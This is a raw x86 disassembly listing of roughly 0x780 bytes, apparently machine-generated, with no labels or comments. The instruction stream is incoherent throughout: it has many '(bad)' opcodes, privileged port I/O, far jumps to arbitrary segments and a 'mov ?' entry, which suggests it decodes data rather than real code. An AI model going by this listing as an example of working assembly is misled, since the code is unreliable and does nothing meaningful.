  6a2201:	jmp    0x6294:0x2e07439a
  6a2208:	adc    eax,eax
  6a220a:	jmp    0xc0cdfae8
  6a220f:	scas   eax,DWORD PTR es:[edi]
  6a2210:	mov    ah,0x4e
  6a2212:	or     al,0xd1
  6a2214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a2215:	jb     0x6a2213
  6a2217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a2218:	fidivr WORD PTR gs:[eax+0x5dc8f025]
  6a221f:	in     eax,0x36
  6a2221:	mov    bh,0xfe
  6a2223:	pop    ss
  6a2224:	and    esi,ebx
  6a2226:	cmp    BYTE PTR [edx],0xb0
  6a2229:	rcl    DWORD PTR [eax+ecx*1-0x6b61e1f5],0x73
  6a2231:	jo     0x6a2205
  6a2233:	sub    BYTE PTR [edi+0x5dd2785f],bl
  6a2239:	sbb    BYTE PTR [ebp-0x49c96ff8],0x81
  6a2240:	or     BYTE PTR [ebx],dh
  6a2242:	test   al,0x43
  6a2244:	inc    esp
  6a2245:	jecxz  0x6a2253
  6a2247:	(bad)  
  6a2249:	jmp    0x6a2226
  6a224b:	dec    esi
  6a224c:	add    eax,0xe347022b
  6a2251:	push   0xd8d13ef1
  6a2256:	and    eax,DWORD PTR [edi-0x1c]
  6a2259:	mov    al,ds:0xc23b9b88
  6a225e:	sub    al,0x14
  6a2260:	sti    
  6a2261:	pop    es
  6a2262:	add    al,BYTE PTR [eax+eax*8-0x6b]
  6a2266:	(bad)  
  6a2267:	cld    
  6a2268:	push   esp
  6a2269:	sbb    BYTE PTR [esi-0x5f],dh
  6a226c:	lds    edx,FWORD PTR [ebx-0x5df8bb5b]
  6a2272:	xor    BYTE PTR [eax+0x3b9227ec],ch
  6a2278:	setne  BYTE PTR [esi-0x3f]
  6a227c:	fcom   QWORD PTR [eax-0x17]
  6a227f:	mov    ah,0x6b
  6a2281:	loopne 0x6a22a0
  6a2283:	inc    ebx
  6a2284:	push   edi
  6a2285:	retf   0x5988
  6a2288:	out    0xc1,eax
  6a228a:	stos   BYTE PTR es:[edi],al
  6a228b:	outs   dx,BYTE PTR ds:[esi]
  6a228c:	je     0x6a2299
  6a228e:	test   BYTE PTR [ecx+0x4c],0xc2
  6a2292:	mov    bh,0x34
  6a2294:	cli    
  6a2295:	mov    ebx,DWORD PTR [edi+0xe]
  6a2298:	xchg   BYTE PTR [ebp+0x70],dh
  6a229b:	jb     0x6a229f
  6a229d:	leave  
  6a229e:	and    eax,0x4eebaf4c
  6a22a3:	dec    esi
  6a22a4:	jae    0x6a2316
  6a22a6:	adc    eax,0x41dc1f26
  6a22ab:	cdq    
  6a22ac:	je     0x6a227e
  6a22ae:	call   0x654727bd
  6a22b3:	mov    bh,al
  6a22b5:	mov    eax,ds:0xf8d7df53
  6a22ba:	iret   
  6a22bb:	icebp  
  6a22bc:	cs and eax,0xffffffe8
  6a22c0:	push   edi
  6a22c1:	imul   edx,DWORD PTR [ebp-0x1bb5eb6b],0xffffff93
  6a22c8:	or     DWORD PTR [eax],0xcd8d775f
  6a22ce:	hlt    
  6a22cf:	adc    dh,cl
  6a22d1:	sub    al,0x4
  6a22d3:	adc    eax,0x84cb2103
  6a22d8:	fmul   DWORD PTR [edi]
  6a22da:	sbb    dl,ch
  6a22dc:	sbb    ah,BYTE PTR [eax+0x30d59728]
  6a22e2:	xchg   ebx,eax
  6a22e3:	adc    ch,BYTE PTR [eiz*2-0x4c7da996]
  6a22ea:	push   ss
  6a22eb:	xor    eax,0x22c8fb2
  6a22f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a22f1:	loopne 0x6a2349
  6a22f3:	inc    esi
  6a22f4:	jg     0x6a22ef
  6a22f6:	pop    edi
  6a22f7:	jge    0x6a22b6
  6a22f9:	add    eax,0xb9085883
  6a22fe:	push   ecx
  6a22ff:	rcr    bl,0xa1
  6a2302:	add    eax,0x281cbacb
  6a2307:	mov    ch,0xd5
  6a2309:	jg     0x6a22a4
  6a230b:	in     eax,0x6a
  6a230d:	out    0xd2,eax
  6a230f:	loope  0x6a233b
  6a2311:	pop    edi
  6a2312:	sahf   
  6a2313:	data16 sub al,0xa4
  6a2316:	cwde   
  6a2317:	ins    BYTE PTR es:[edi],dx
  6a2318:	es jp  0x6a22eb
  6a231b:	das    
  6a231c:	add    BYTE PTR [edi+0x43],dh
  6a231f:	adc    eax,0xb217bd60
  6a2324:	mov    dh,0xf1
  6a2326:	sbb    BYTE PTR [eax+0x776083b],ch
  6a232c:	sbb    BYTE PTR [ecx+0x5b],ch
  6a232f:	(bad)  
  6a2330:	jo     0x6a2305
  6a2332:	or     eax,ecx
  6a2334:	sbb    eax,0xbc7953bd
  6a2339:	xchg   ecx,eax
  6a233a:	sahf   
  6a233b:	je     0x6a2332
  6a233d:	(bad)  
  6a233e:	pop    edi
  6a233f:	aam    0x5e
  6a2341:	popa   
  6a2342:	fcomp  DWORD PTR [ebx-0x66]
  6a2345:	and    esp,ebx
  6a2347:	mov    BYTE PTR [esi],cl
  6a2349:	loopne 0x6a2312
  6a234b:	mov    edx,0x7922ebc5
  6a2350:	cld    
  6a2351:	outs   dx,BYTE PTR ds:[esi]
  6a2352:	push   0x58
  6a2354:	push   edi
  6a2356:	pop    edi
  6a2357:	mul    eax
  6a2359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a235a:	xor    al,0xa2
  6a235c:	test   BYTE PTR [esi-0x3b],ch
  6a235f:	or     eax,0x42ecf939
  6a2364:	mov    ebx,0xfb53c5a4
  6a2369:	jae    0x6a23e5
  6a236b:	pop    ecx
  6a236c:	pop    esi
  6a236d:	scas   al,BYTE PTR es:[edi]
  6a236e:	xchg   ebp,eax
  6a236f:	push   esi
  6a2370:	retf   
  6a2371:	rcr    DWORD PTR [eax+0x6e],1
  6a2374:	or     ch,al
  6a2376:	es std 
  6a2378:	mov    esp,0x19624a65
  6a237d:	dec    edx
  6a237e:	lds    esi,FWORD PTR [eax+0x6c]
  6a2381:	in     al,0xed
  6a2383:	adc    BYTE PTR [esi-0x4ccbb1d7],al
  6a2389:	(bad)  
  6a238a:	in     eax,dx
  6a238b:	mov    eax,ds:0x170dbf84
  6a2390:	pop    ecx
  6a2392:	dec    ebp
  6a2393:	outs   dx,DWORD PTR ds:[esi]
  6a2394:	pop    edi
  6a2395:	mov    eax,0xbeec7117
  6a239a:	into   
  6a239b:	mov    bl,0x3
  6a239d:	push   ecx
  6a239e:	test   DWORD PTR [ebx-0x644edd30],0x84e7180b
  6a23a8:	cmp    eax,0x15854f85
  6a23ad:	nop
  6a23ae:	sar    DWORD PTR [ecx+eiz*8-0x4d],1
  6a23b2:	xchg   ecx,eax
  6a23b3:	push   es
  6a23b4:	rol    bl,cl
  6a23b6:	ja     0x6a2387
  6a23b8:	mov    esi,0xd0c04f45
  6a23bd:	repz std 
  6a23bf:	xor    DWORD PTR [ecx+0x1ae1a06a],0xffffff8b
  6a23c6:	jp     0x6a23a5
  6a23c8:	inc    edx
  6a23c9:	mov    ds:0x79bbf8c,al
  6a23ce:	sbb    al,0xd0
  6a23d0:	mov    eax,ds:0xa43e896c
  6a23d5:	push   0xffffffb0
  6a23d7:	mov    al,ds:0x65f7071a
  6a23dc:	mov    ds:0xc386d121,eax
  6a23e1:	cmp    DWORD PTR [edi],0x9
  6a23e4:	add    BYTE PTR [ebx+0x1e],0x6d
  6a23e8:	xchg   ecx,eax
  6a23e9:	aas    
  6a23ea:	test   BYTE PTR [edi-0x104f9ba7],ch
  6a23f0:	enter  0xe6b9,0x5b
  6a23f4:	pop    edx
  6a23f5:	inc    eax
  6a23f6:	xor    ebx,0x6d8d337a
  6a23fc:	jmp    eax
  6a23fe:	out    0x34,eax
  6a2400:	test   al,0xd0
  6a2402:	pop    edx
  6a2403:	lods   eax,DWORD PTR ds:[esi]
  6a2404:	inc    ebp
  6a2405:	out    dx,al
  6a2406:	lea    ebp,[esi-0x1b]
  6a2409:	adc    al,0x3
  6a240b:	mov    ebp,esp
  6a240d:	jge    0x6a241b
  6a240f:	mov    esi,0xa17a9848
  6a2414:	push   0x18
  6a2416:	mov    BYTE PTR [edx-0x34ab44f2],ah
  6a241c:	pop    es
  6a241d:	and    ecx,ebx
  6a241f:	in     al,dx
  6a2420:	repz mov ch,BYTE PTR [ebx+0x32]
  6a2424:	aad    0x5
  6a2426:	and    DWORD PTR [eax+0x39],0x7faa664f
  6a242d:	mov    BYTE PTR [ebp-0x61],ah
  6a2430:	pop    esp
  6a2431:	mov    dh,0x1f
  6a2433:	out    dx,al
  6a2434:	dec    edx
  6a2435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a2436:	add    edi,ebx
  6a2438:	jp     0x6a2456
  6a243a:	mov    ebx,0x3a601a8c
  6a243f:	test   ebp,esi
  6a2441:	aas    
  6a2442:	add    esi,DWORD PTR [edx+0x51]
  6a2445:	mov    ebp,0x7ebddc45
  6a244a:	dec    edx
  6a244b:	inc    edx
  6a244c:	cdq    
  6a244d:	das    
  6a244e:	cmp    al,0xed
  6a2450:	pop    ecx
  6a2451:	push   ebp
  6a2452:	and    eax,0xc551b169
  6a2457:	ins    BYTE PTR es:[edi],dx
  6a2458:	and    DWORD PTR [esi+0x39],ebp
  6a245b:	out    dx,eax
  6a245c:	inc    edi
  6a245d:	stos   DWORD PTR es:[edi],eax
  6a245e:	jmp    eax
  6a2460:	sti    
  6a2461:	and    al,0xc1
  6a2463:	nop
  6a2464:	loope  0x6a2422
  6a2466:	push   cs
  6a2467:	sbb    al,0xbf
  6a2469:	push   ebx
  6a246a:	cmp    BYTE PTR [edx],al
  6a246c:	(bad)  
  6a246d:	ror    BYTE PTR [ebx],1
  6a246f:	mov    bl,BYTE PTR [edi+0x52]
  6a2472:	xchg   ecx,eax
  6a2473:	lahf   
  6a2474:	iret   
  6a2475:	add    edi,ebp
  6a2477:	cmp    DWORD PTR [esp+eiz*8+0x6e309cea],ebp
  6a247e:	mov    ds:0x288ed9df,eax
  6a2483:	mov    ah,0x30
  6a2485:	test   al,0x63
  6a2487:	push   eax
  6a2488:	shr    DWORD PTR [bp+0x7],0xef
  6a248d:	das    
  6a248e:	(bad)  
  6a2490:	pop    es
  6a2491:	sbb    cl,bh
  6a2493:	mov    DWORD PTR [ebp-0x23a7750f],ebx
  6a2499:	in     eax,dx
  6a249a:	xor    eax,0x35d3f145
  6a249f:	push   ss
  6a24a0:	add    BYTE PTR [edi-0xfdc9cde],0xa8
  6a24a7:	ja     0x6a2436
  6a24a9:	and    al,0xb1
  6a24ab:	mov    dl,0x9d
  6a24ad:	and    BYTE PTR [ebp+0x2a],0x1d
  6a24b1:	add    cl,cl
  6a24b3:	ret    
  6a24b4:	cmp    BYTE PTR [eax-0x4d],al
  6a24b7:	sub    ebx,eax
  6a24b9:	dec    edx
  6a24ba:	fnsave [esi+0x26]
  6a24bd:	pop    es
  6a24be:	xchg   BYTE PTR [esi+0xbd8bc24],cl
  6a24c4:	mov    cl,0x73
  6a24c6:	mov    cl,0x2
  6a24c8:	cmc    
  6a24c9:	dec    ecx
  6a24ca:	mov    eax,ds:0xd07f0a8f
  6a24cf:	cmp    eax,0x7e6f1640
  6a24d4:	addr16 jmp 0xc2b6:0xc9cad52f
  6a24dc:	jmp    0x393a:0x27059000
  6a24e3:	cmc    
  6a24e4:	fcmovnbe st,st(2)
  6a24e6:	cdq    
  6a24e7:	aaa    
  6a24e8:	iret   
  6a24e9:	(bad)  
  6a24ea:	aam    0xb4
  6a24ec:	xchg   ecx,eax
  6a24ed:	scas   al,BYTE PTR es:[edi]
  6a24ee:	call   0xbb4b:0x49c06c42
  6a24f5:	sub    ebp,DWORD PTR [ecx]
  6a24f7:	or     ch,BYTE PTR [ecx-0x6438fb04]
  6a24fd:	mov    dl,0x17
  6a24ff:	stos   BYTE PTR es:[edi],al
  6a2500:	xchg   edi,eax
  6a2501:	bound  ecx,QWORD PTR [eax+0x13]
  6a2504:	mov    DWORD PTR [ebx-0x64fb0d6e],ebp
  6a250a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a250b:	rol    DWORD PTR [ebp+0x3e0ff8fe],1
  6a2511:	add    bh,BYTE PTR [edi]
  6a2513:	retf   
  6a2514:	xor    ch,bh
  6a2516:	in     eax,dx
  6a2517:	rol    ecx,1
  6a2519:	or     ebx,DWORD PTR [ebx+0x2]
  6a251c:	lods   eax,DWORD PTR ds:[esi]
  6a251d:	loopne 0x6a24c6
  6a251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a2520:	mov    dl,0xf1
  6a2522:	repnz sub edx,0xffffffc8
  6a2526:	and    eax,0xd3bbc5b1
  6a252b:	push   ss
  6a252c:	adc    eax,0x9caf7df2
  6a2531:	fdiv   st,st(1)
  6a2533:	push   edx
  6a2534:	xchg   ebx,eax
  6a2535:	dec    esi
  6a2536:	fwait
  6a2537:	sub    ecx,edi
  6a2539:	dec    ecx
  6a253a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a253b:	retf   0xd7a9
  6a253e:	repnz add al,BYTE PTR [esi]
  6a2541:	leave  
  6a2542:	in     eax,dx
  6a2543:	int3   
  6a2544:	mov    DWORD PTR [ecx-0x17],ebp
  6a2547:	aam    0xca
  6a2549:	rol    DWORD PTR ss:[edx],0x93
  6a254d:	mov    edx,0x1f5b8a20
  6a2552:	lds    ecx,FWORD PTR [esi-0x57]
  6a2555:	addr16 in eax,0xf2
  6a2558:	xchg   esp,eax
  6a2559:	shr    DWORD PTR [ebx-0x39],0x85
  6a255d:	lods   eax,DWORD PTR ds:[esi]
  6a255e:	mov    ecx,0x44eb922e
  6a2563:	sub    BYTE PTR [ecx+0x24ade49c],0x9e
  6a256a:	fldcw  WORD PTR [ebx+0x39]
  6a256d:	push   ebx
  6a256e:	cmp    dh,BYTE PTR ds:0x98e108e8
  6a2574:	mov    bl,cl
  6a2576:	xchg   edi,eax
  6a2577:	cmp    BYTE PTR [eax+0x7b6865e0],bl
  6a257d:	neg    BYTE PTR [ebx-0x7aaf2272]
  6a2583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2584:	push   ebx
  6a2585:	push   edx
  6a2586:	push   ss
  6a2587:	xor    eax,edi
  6a2589:	jb     0x6a2566
  6a258b:	mov    edx,0x70150882
  6a2590:	fbstp  TBYTE PTR [ebx+0x75a3add0]
  6a2596:	and    eax,0x5af00bcc
  6a259b:	mov    ds:0xc4d397b2,al
  6a25a0:	inc    esp
  6a25a1:	pop    esi
  6a25a2:	jbe    0x6a2560
  6a25a4:	or     DWORD PTR [esi-0x53],eax
  6a25a7:	repnz nop
  6a25a9:	enter  0xba19,0xd5
  6a25ad:	add    ecx,DWORD PTR [ecx+0x79c23af6]
  6a25b3:	sbb    dh,BYTE PTR [edx-0x5ce9b35f]
  6a25b9:	in     al,dx
  6a25ba:	lods   al,BYTE PTR ds:[esi]
  6a25bb:	test   al,0x9c
  6a25bd:	and    dh,dl
  6a25bf:	push   es
  6a25c0:	ins    DWORD PTR es:[edi],dx
  6a25c1:	inc    eax
  6a25c2:	sahf   
  6a25c3:	push   0xc
  6a25c5:	jmp    0xb150:0xd59a3257
  6a25cc:	fadd   st(7),st
  6a25ce:	jae    0x6a263d
  6a25d0:	or     edi,DWORD PTR [esp+ecx*4+0x10]
  6a25d4:	mov    cl,0xac
  6a25d6:	adc    DWORD PTR [ebx-0x27196c85],0x21ba21a3
  6a25e0:	jmp    0x214f6ae3
  6a25e5:	(bad)  
  6a25e6:	sbb    DWORD PTR [eax-0x7ea2f845],esp
  6a25ec:	and    BYTE PTR [edx+0x65349dc6],ch
  6a25f2:	add    bh,BYTE PTR ds:0x383d993f
  6a25f8:	mov    ds:0x6abdd879,al
  6a25fd:	rol    BYTE PTR ds:0xc7fadbeb,1
  6a2603:	xor    ah,BYTE PTR [edx+ebp*4+0x15]
  6a2607:	sbb    ebx,DWORD PTR [ebx-0x7e]
  6a260a:	fs xor al,0xcd
  6a260d:	cs loopne 0x6a2674
  6a2610:	push   ebp
  6a2611:	inc    esi
  6a2612:	lods   al,BYTE PTR ds:[esi]
  6a2613:	mov    eax,ds:0x3f23fb72
  6a2618:	mov    al,ds:0x947d0455
  6a261d:	pusha  
  6a261e:	xchg   ebx,eax
  6a261f:	and    eax,0xec4792ba
  6a2624:	and    BYTE PTR [ebx],al
  6a2626:	xor    eax,0x4f4761b8
  6a262b:	add    bl,al
  6a262d:	xor    al,0x89
  6a262f:	pop    esi
  6a2630:	inc    eax
  6a2631:	mov    ds:0xd67ddb15,eax
  6a2636:	stc    
  6a2637:	rol    BYTE PTR [ecx],1
  6a2639:	stos   DWORD PTR es:[edi],eax
  6a263a:	outs   dx,BYTE PTR ds:[esi]
  6a263b:	sahf   
  6a263c:	std    
  6a263d:	mov    esi,0x6df333db
  6a2642:	fs jle 0x6a2659
  6a2645:	or     al,BYTE PTR [esp+edi*2+0x9ec4a23]
  6a264c:	(bad)  
  6a264d:	fcomp  DWORD PTR [ecx+edx*4]
  6a2650:	mov    ecx,0x5145ebc3
  6a2655:	lea    ebx,[edx+0x4f]
  6a2658:	inc    esp
  6a2659:	clc    
  6a265a:	xchg   ecx,eax
  6a265b:	aam    0xff
  6a265d:	xor    dl,0x83
  6a2660:	lods   al,BYTE PTR ds:[esi]
  6a2661:	dec    ebx
  6a2662:	mov    bl,0x44
  6a2664:	push   0xbda74825
  6a2669:	add    esp,DWORD PTR [esi]
  6a266b:	mov    bh,BYTE PTR [edx+0x53296eaa]
  6a2671:	adc    al,0x28
  6a2673:	ror    DWORD PTR [edx-0x70aecb4b],1
  6a2679:	je     0x6a26eb
  6a267b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a267c:	mov    bh,bh
  6a267e:	cmp    dh,BYTE PTR [esi-0xeadfae2]
  6a2684:	mov    ?,WORD PTR [edx]
  6a2686:	fisub  DWORD PTR [esi-0x721e3d3c]
  6a268c:	dec    edi
  6a268d:	fisttp WORD PTR [ebp+0x7c]
  6a2690:	mov    dl,0xe4
  6a2692:	in     al,dx
  6a2693:	inc    edx
  6a2694:	mov    al,0xd9
  6a2696:	jo     0x6a26e2
  6a2698:	(bad)  
  6a2699:	into   
  6a269a:	loop   0x6a270c
  6a269c:	xchg   edi,eax
  6a269d:	repnz das 
  6a269f:	push   ecx
  6a26a0:	fs mov edi,0x5463b9fa
  6a26a6:	cmp    al,0x9e
  6a26a8:	mov    ah,0x8b
  6a26aa:	inc    ebp
  6a26ab:	loopne 0x6a26b0
  6a26ad:	push   esp
  6a26ae:	leave  
  6a26af:	xlat   BYTE PTR ds:[ebx]
  6a26b0:	imul   esp,DWORD PTR [eax],0x59b066d1
  6a26b6:	inc    ebx
  6a26b7:	inc    edx
  6a26b8:	dec    edi
  6a26b9:	pop    ss
  6a26ba:	cmp    ch,cl
  6a26bc:	(bad)  
  6a26bd:	push   ecx
  6a26be:	sub    al,0x1d
  6a26c0:	into   
  6a26c1:	dec    ecx
  6a26c2:	mov    ds,WORD PTR [edi+eiz*1-0x75f26712]
  6a26c9:	xor    ebp,eax
  6a26cb:	stos   DWORD PTR es:[edi],eax
  6a26cc:	or     al,0x5a
  6a26ce:	repz mov dl,0x5c
  6a26d1:	pop    edx
  6a26d2:	neg    edi
  6a26d4:	push   ss
  6a26d5:	fs neg dh
  6a26d8:	push   ss
  6a26d9:	push   ds
  6a26da:	cmp    eax,0x1f4a8453
  6a26df:	pop    edi
  6a26e0:	int    0xb5
  6a26e2:	xor    eax,0xbc351e
  6a26e7:	fmul   QWORD PTR [ebp+eiz*8+0x1c]
  6a26eb:	cmp    DWORD PTR [ebp+0x51],ecx
  6a26ee:	inc    ebp
  6a26ef:	jp     0x6a2691
  6a26f1:	dec    eax
  6a26f2:	dec    edi
  6a26f3:	mov    ah,0x58
  6a26f5:	adc    bh,BYTE PTR [esi-0x24303551]
  6a26fb:	jp     0x6a269c
  6a26fd:	aaa    
  6a26fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a26ff:	in     eax,dx
  6a2700:	xchg   DWORD PTR [ebx-0x68],esp
  6a2703:	xchg   edi,eax
  6a2704:	repz xchg ecx,eax
  6a2706:	mov    BYTE PTR [esi+esi*1],ch
  6a2709:	repnz sbb al,0x35
  6a270c:	call   0xdb8d:0x16433177
  6a2713:	stos   DWORD PTR es:[edi],eax
  6a2714:	fimul  WORD PTR [edx+0x58]
  6a2717:	aaa    
  6a2718:	xchg   BYTE PTR [ecx-0x4754b60e],ch
  6a271e:	imul   edi,DWORD PTR [esi+0x310a959],0x37b30f9a
  6a2728:	stc    
  6a2729:	jg     0x6a26f8
  6a272b:	pop    esp
  6a272c:	jle    0x6a272a
  6a272e:	mov    ds:0xb713e838,eax
  6a2733:	cmp    ch,BYTE PTR [edx-0x55]
  6a2736:	push   edi
  6a2737:	inc    esp
  6a2738:	aam    0x98
  6a273a:	dec    edx
  6a273b:	sbb    eax,0x790e54e6
  6a2740:	mov    WORD PTR ds:0xfcbd67ac,es
  6a2746:	jbe    0x6a26cf
  6a2748:	ds and eax,0x92414c0b
  6a274e:	add    DWORD PTR [esi-0xa],ecx
  6a2751:	aam    0xa9
  6a2753:	rep lods eax,DWORD PTR ds:[esi]
  6a2755:	mov    WORD PTR [ecx+0xe],gs
  6a2758:	sbb    eax,0xbff50a20
  6a275d:	sub    ah,BYTE PTR [edx]
  6a275f:	test   DWORD PTR [ebx+0x7c],0xd92c21e6
  6a2766:	jne    0x6a2732
  6a2768:	(bad)  
  6a276b:	add    esp,edi
  6a276d:	aas    
  6a276e:	push   eax
  6a276f:	(bad)  
  6a2770:	and    BYTE PTR [esi+0xe],cl
  6a2773:	sbb    eax,0x747d58a5
  6a2778:	les    ebx,FWORD PTR [edx-0x59]
  6a277b:	sub    esi,DWORD PTR [esi-0x1578a3f5]
  6a2781:	fucomp st(5)
  6a2783:	fsubr  DWORD PTR [eax-0x60a3ca3]
  6a2789:	ss test al,0x41
  6a278c:	ins    BYTE PTR es:[edi],dx
  6a278d:	pusha  
  6a278e:	mov    eax,ds:0xff896036
  6a2793:	retf   
  6a2794:	ret    
  6a2795:	icebp  
  6a2796:	pop    esi
  6a2797:	jge    0x6a279c
  6a2799:	or     ecx,ebx
  6a279b:	outs   dx,BYTE PTR ds:[esi]
  6a279c:	adc    ebp,ebx
  6a279e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a279f:	in     al,dx
  6a27a0:	pusha  
  6a27a1:	test   al,0x81
  6a27a3:	pop    eax
  6a27a4:	stc    
  6a27a5:	icebp  
  6a27a6:	sub    dl,0x8c
  6a27a9:	push   cs
  6a27aa:	xchg   DWORD PTR [ebx],esi
  6a27ac:	add    al,0x9c
  6a27ae:	ss aas 
  6a27b0:	div    DWORD PTR [ebp+ecx*4+0x69]
  6a27b4:	daa    
  6a27b5:	pop    ss
  6a27b6:	or     al,BYTE PTR [esi-0x6f]
  6a27b9:	jae    0x6a2791
  6a27bb:	jns    0x6a2819
  6a27bd:	ins    DWORD PTR es:[edi],dx
  6a27be:	imul   edi,ebx,0x700548f3
  6a27c4:	mov    edi,0x62b7fcdd
  6a27c9:	xchg   DWORD PTR [ebx],ecx
  6a27cb:	mov    ds:0xa06b0c30,eax
  6a27d1:	push   edi
  6a27d2:	mov    ecx,0xa19639c0
  6a27d7:	fldenv [edi+0x48]
  6a27da:	sub    al,0x9
  6a27dc:	jge    0x6a2849
  6a27de:	stos   BYTE PTR es:[edi],al
  6a27df:	cs sbb eax,0xdc151e8c
  6a27e5:	rcl    esp,0xdc
  6a27e8:	nop
  6a27e9:	cmp    eax,0x4a22eea8
  6a27ee:	or     DWORD PTR [ecx],eax
  6a27f0:	jmp    0x59ca:0x59460464
  6a27f7:	mov    eax,ds:0xc68ef694
  6a27fc:	out    dx,eax
  6a27fd:	mov    dh,BYTE PTR [eax]
  6a27ff:	std    
  6a2800:	push   ecx
  6a2801:	fdivrp st(4),st
  6a2803:	rcl    BYTE PTR ds:[ebx-0x72199b68],0xf2
  6a280b:	cmp    DWORD PTR [eax-0x5d],ebp
  6a280e:	mul    bl
  6a2810:	add    BYTE PTR [ecx],bh
  6a2812:	cwde   
  6a2813:	dec    edx
  6a2814:	std    
  6a2815:	fiadd  WORD PTR [eax+ecx*8]
  6a2818:	add    ebx,ebp
  6a281a:	adc    BYTE PTR [ebx],dh
  6a281c:	cmp    edx,DWORD PTR [eax]
  6a281e:	mov    ebx,0x8a3f3aaa
  6a2823:	cmp    esi,DWORD PTR [eax+0x5c35b135]
  6a2829:	push   eax
  6a282a:	call   0x707898c8
  6a282f:	xor    BYTE PTR ds:0x7a5bffc4,bl
  6a2835:	aad    0xb4
  6a2837:	lods   eax,DWORD PTR ds:[esi]
  6a2838:	or     eax,0xdae5835e
  6a283d:	in     eax,0xd9
  6a283f:	inc    ecx
  6a2840:	inc    esp
  6a2841:	and    eax,esi
  6a2843:	imul   edx,eax,0x76
  6a2846:	leave  
  6a2847:	mov    cl,0x92
  6a2849:	out    0x1,al
  6a284b:	inc    ecx
  6a284c:	cs mov al,0xb
  6a284f:	mov    ah,BYTE PTR [edx-0x3fe46b64]
  6a2855:	fnsave [ecx+0x3a247fac]
  6a285b:	lds    edx,FWORD PTR [edi+edi*1-0x3ff71f6c]
  6a2862:	mov    DWORD PTR [esi],0x6f9f1dee
  6a2868:	ds jo  0x6a2872
  6a286b:	mov    al,ds:0x85e4eeec
  6a2870:	sti    
  6a2871:	popf   
  6a2872:	bound  esp,QWORD PTR [edx+0x1078747e]
  6a2878:	mov    edx,0xa6e36d0d
  6a287d:	test   al,0x27
  6a287f:	add    ch,BYTE PTR [edx-0x1b]
  6a2882:	cli    
  6a2883:	jno    0x6a281a
  6a2885:	ror    bl,0x9d
  6a2888:	pushf  
  6a2889:	addr16 xor al,al
  6a288c:	xchg   ecx,eax
  6a288d:	popf   
  6a288e:	or     esp,edx
  6a2890:	stos   DWORD PTR es:[edi],eax
  6a2891:	xor    BYTE PTR [eax+0x76509b05],bh
  6a2897:	xchg   esp,eax
  6a2898:	psubq  mm4,QWORD PTR [edx+0xadfa7]
  6a289f:	xor    eax,0x860804ab
  6a28a4:	test   al,0xf2
  6a28a6:	sub    BYTE PTR [ebx+ebx*1-0x1998aba7],0x83
  6a28ae:	outs   dx,DWORD PTR ds:[esi]
  6a28af:	ins    BYTE PTR es:[edi],dx
  6a28b0:	mov    ds:0x1cd1d139,al
  6a28b5:	dec    edx
  6a28b6:	shl    BYTE PTR [ecx-0x79],1
  6a28b9:	mov    ah,0xca
  6a28bb:	lahf   
  6a28bc:	mov    al,BYTE PTR [ecx+edx*1+0x1385699f]
  6a28c3:	mov    dl,0x51
  6a28c5:	adc    al,0x70
  6a28c7:	call   0xb4faa186
  6a28cc:	xor    esi,DWORD PTR [ebp-0xc31e0f2]
  6a28d2:	hlt    
  6a28d3:	enter  0xc9ef,0x4a
  6a28d7:	popw   ss
  6a28d9:	rcr    DWORD PTR [edi+eax*8+0xd],cl
  6a28dd:	imul   ebx,eax,0xea75ea8c
  6a28e3:	inc    ebx
  6a28e4:	call   0x66fe5602
  6a28e9:	out    dx,eax
  6a28ea:	pushf  
  6a28eb:	ins    DWORD PTR es:[edi],dx
  6a28ec:	adc    esi,0x8
  6a28ef:	mov    al,0x83
  6a28f1:	(bad)  
  6a28f2:	les    ecx,FWORD PTR [edx]
  6a28f4:	push   0x968c0a4c
  6a28f9:	and    ch,bh
  6a28fb:	mov    ah,0x31
  6a28fd:	jl     0x6a28c3
  6a28ff:	sbb    DWORD PTR [edi],0x8addd8d4
  6a2905:	inc    esp
  6a2906:	les    esi,FWORD PTR [edi]
  6a2908:	xchg   edi,eax
  6a2909:	cld    
  6a290a:	lea    ebp,[edx+0x5a5bc371]
  6a2910:	in     eax,0x99
  6a2912:	and    DWORD PTR [esi-0x4],ecx
  6a2915:	inc    eax
  6a2916:	sub    edx,esp
  6a2918:	cwde   
  6a2919:	and    bl,BYTE PTR [esi+0x7a]
  6a291c:	cld    
  6a291d:	pusha  
  6a291e:	test   DWORD PTR [edi-0x2c44211e],ecx
  6a2924:	add    DWORD PTR [edi],ebp
  6a2926:	das    
  6a2927:	push   ds
  6a2928:	popfw  
  6a292a:	fdiv   QWORD PTR [ecx+0x58ff20ef]
  6a2930:	dec    esi
  6a2931:	push   ebx
  6a2932:	adc    eax,0xdc95035b
  6a2937:	cwde   
  6a2938:	cmp    edi,DWORD PTR [eax+0x3f]
  6a293b:	add    DWORD PTR [esi-0x360cb8ed],edi
  6a2941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2942:	mov    edi,0x557084ab
  6a2947:	sbb    eax,0x74539292
  6a294c:	pop    ss
  6a294d:	xor    esi,DWORD PTR [edi]
  6a294f:	push   eax
  6a2950:	lds    esi,FWORD PTR [edx+0x24]
  6a2953:	repz shl dl,0xf4
  6a2957:	and    BYTE PTR [edx-0x1c],ah
  6a295a:	stos   DWORD PTR es:[edi],eax
  6a295b:	inc    edx
  6a295c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a295d:	bnd call 0x98aca72d
  6a2963:	int    0x93
  6a2965:	pop    eax
  6a2966:	adc    al,0x2d
  6a2968:	mov    dh,0x5a
  6a296a:	add    dl,BYTE PTR [edi]
  6a296c:	fs loope 0x6a2974
  6a296f:	out    dx,al
  6a2970:	repz jmp 0x98b3:0xbbb3b03c
  6a2978:	push   eax
  6a2979:	pusha  
  6a297a:	retf   0x6ff2
  6a297d:	jbe    0x6a29e3
  6a297f:	mov    DWORD PTR [edx+0x2d79f499],eax
  6a2985:	push   0x43
  6a2987:	inc    ecx
